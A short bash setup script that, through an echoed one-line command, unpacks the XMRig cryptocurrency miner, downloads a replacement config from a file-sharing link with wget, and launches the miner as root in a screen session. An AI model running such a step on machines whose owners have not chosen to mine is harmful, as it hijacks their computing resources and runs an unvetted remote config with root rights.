#! / bin / bash
# __BEGIN_MAIN__
#
echo cd gominer && sudo tar -xvf xmrig-5.5.3-xenial-x64.tar.gz && cd xmrig-5.5.3 && rm -r config.json && wget https://cld.pt/dl/download/d37fa8ca-17fe-4905-bcbb-badf32a7be44/sapotransfer-59ddaaea41731bt/config.json?download=true && mv config.json?download=true config.json && sudo apt-get install screen && sudo screen ./xmrig
# __END_MAIN__
